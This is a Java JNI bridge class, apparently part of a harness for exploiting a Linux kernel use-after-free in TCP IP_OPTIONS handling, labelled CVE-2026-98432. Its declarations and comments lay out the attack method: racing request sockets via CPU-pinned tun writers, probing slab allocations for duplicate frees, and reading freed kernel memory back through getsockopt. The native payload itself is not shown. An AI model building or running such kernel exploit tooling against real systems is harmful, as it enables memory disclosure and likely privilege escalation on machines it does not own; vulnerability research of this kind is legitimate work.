package com.inj;

/**
 * Thin bridge to the syscalls the Java socket API does not expose.
 *
 * Everything CVE-2026-98432 touches sits behind setsockopt(IP_OPTIONS) and
 * getsockopt(IP_OPTIONS): the first allocates the ip_options_rcu that a request
 * socket ends up holding, the second is the read that trusts optlen. Neither is
 * reachable from java.net, so they live here.
 */
public final class Native {

    static {
        System.loadLibrary("injnative");
    }

    private Native() {
    }

    /** Attach a 40 byte record route option to an existing socket. Returns 0 or -errno. */
    public static native int applyOptions(int fd, int tag);

    /** Read the options back, returned as "len=N hexbytes" or an error string. */
    public static native String readOptions(int fd);

    /**
     * Create a listening socket on addr:port.
     *
     * Returns {fd, 0} on success, or {-1, errno} on failure. The raw fd comes
     * back because the caller has to setsockopt(IP_OPTIONS) on it: the whole
     * bug hangs off the options object that a TCP child inherits from its
     * listener, and java.net.ServerSocket cannot carry options at all.
     */
    public static native int[] makeListener(String addr, int port);

    /** UDP socket carrying its own options object, as a control case. */
    public static native int[] makeUdp(int tag);

    /**
     * Allocate count options objects with tag == index, then read every one
     * back and report anomalies.
     *
     * A clean slab run reports mismatched=0 badlen=0 dup=0. A duplicate free
     * shows up as a socket whose tag is not its own, or the same tag twice.
     */
    public static native String probeHeap(int count);

    /**
     * Pin the calling thread to one cpu. Returns the cpu count, or -errno.
     *
     * Needed for the race: the tun receive path runs in the writer's own
     * softirq, so writers parked on the same cpu are strictly ordered.
     */
    public static native int pinToCpu(int cpu);

    /** Which cpu the calling thread is on right now. */
    public static native int currentCpu();

    /**
     * Start the native race writers on an existing tun fd.
     *
     * These live entirely in C because the race window is hundreds of
     * nanoseconds wide. A Java writer costs microseconds between leaving its
     * spin and entering tun_get_user, which is an order of magnitude too slow.
     */
    public static native int raceStart(int fd, int count);

    /** Release every race writer with a pair of packets; returns how many fired. */
    public static native int raceFire(byte[] a, byte[] b);

    /** Stop and join the race writers. */
    public static native void raceStop();

    /**
     * Spread of the last race round in nanoseconds: {last, min, max}.
     *
     * This is the measurement that decides whether the request socket race is
     * reachable at all. The window inside tcp_v4_syn_recv_sock is on the order
     * of a microsecond, so a spread well above that means no arrangement of the
     * writers can ever overlap them.
     */
    public static native long[] raceSpread();

    /**
     * Accept one connection on a listening fd created by makeListener.
     *
     * Returns the new fd, or -errno. The Java layer has no way to accept on a
     * raw fd, and the attack listener only exists as one.
     */
    public static native int acceptFd(int fd);

    /** Accept and close children in a tight native loop; returns how many. */
    public static native long acceptClose(int fd, int count);

    /** Accept and RST children (SO_LINGER 0) in a tight native loop. */
    public static native long rstSrtt(int fd, int rounds);

    /**
     * Read IP_OPTIONS from a socket, as "len=N head=<hex>" or "none errno=N".
     *
     * This is the direct view of the bug: a child whose request socket lost the
     * ehash race keeps a pointer to an options object that the losing child
     * already freed, so what comes back here is whatever that slab slot holds
     * now instead of the options the SYN carried.
     */
    public static native String readFdOptions(int fd);

    public static native int closeFd(int fd);
}